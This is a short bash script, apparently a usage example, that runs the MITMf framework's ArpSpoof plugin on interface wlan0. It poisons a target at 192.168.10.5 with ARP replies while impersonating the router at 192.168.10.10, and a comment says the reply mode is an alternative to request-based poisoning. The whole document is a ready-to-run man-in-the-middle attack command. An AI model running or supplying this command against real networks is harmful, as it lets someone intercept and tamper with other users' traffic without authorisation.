#!/bin/bash
# the ArpSpoof plugin also supports poisoning by ARP-replies instead of ARP-requests: 
sudo python mitmf.py --arpspoof --iface wlan0 --routerip 192.168.10.10 --target 192.168.10.5 --mode rep
